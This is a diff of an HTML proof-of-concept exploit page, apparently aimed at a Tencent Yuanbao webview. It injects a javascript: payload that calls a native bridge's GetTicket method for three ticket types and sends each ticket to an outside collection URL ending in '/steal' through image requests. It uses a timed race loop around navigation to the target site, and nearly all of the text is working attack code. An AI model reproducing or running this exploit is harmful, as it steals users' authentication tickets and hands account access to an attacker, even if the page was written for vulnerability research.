@@ -2,28 +2,21 @@
 <html>
 <head><meta charset="utf-8"><title>Race GetTicket</title></head>
 <body>
-<h2>Race - GetTicket Steal</h2>
+<h2>Race - GetTicket Steal (W9/W10/W14)</h2>
 <pre id="log" style="font-size:10px;"></pre>
 <script>
 var log = document.getElementById('log');
 function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
 
-// 外传地址
 var EXFIL = 'https://test2.lleavesg.top/steal';
 
-// 注入 payload：注册 callback + 调用 GetTicket + Image 外传 + 设置 title
 var js = 'javascript:void('
-    + 'window._s=function(d){'
-    +   'document.title=d;'
-    +   'new Image().src="' + EXFIL + '?d="+encodeURIComponent(d)'
-    + '},'
-    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({'
-    +   'callback:"_s",'
-    +   'module:"CommonPlugin",'
-    +   'method:"GetTicket",'
-    +   'param:{type:"W9"},'
-    +   'callId:"s"'
-    + '}))'
+    + 'window._w9=function(d){new Image().src="' + EXFIL + '?t=w9&d="+encodeURIComponent(d)},'
+    + 'window._w10=function(d){new Image().src="' + EXFIL + '?t=w10&d="+encodeURIComponent(d)},'
+    + 'window._w14=function(d){new Image().src="' + EXFIL + '?t=w14&d="+encodeURIComponent(d)},'
+    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w9",module:"CommonPlugin",method:"GetTicket",param:{type:"W9"},callId:"w9"})),'
+    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w10",module:"CommonPlugin",method:"GetTicket",param:{type:"W10"},callId:"w10"})),'
+    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w14",module:"CommonPlugin",method:"GetTicket",param:{type:"W14"},callId:"w14"}))'
     + ')';
 
 var c = 0;
@@ -46,12 +39,10 @@ function doRace() {
 
     location.href = "https://yuanbao.tencent.com/";
 
-    // Phase 1: 同步循环
     for (var i = 0; i < 500; i++) {
         try { sendOne(); } catch(e) { break; }
     }
 
-    // Phase 2: setTimeout 后备
     for (var d = 0; d <= 500; d += 50) {
         (function(delay) {
             setTimeout(function() {
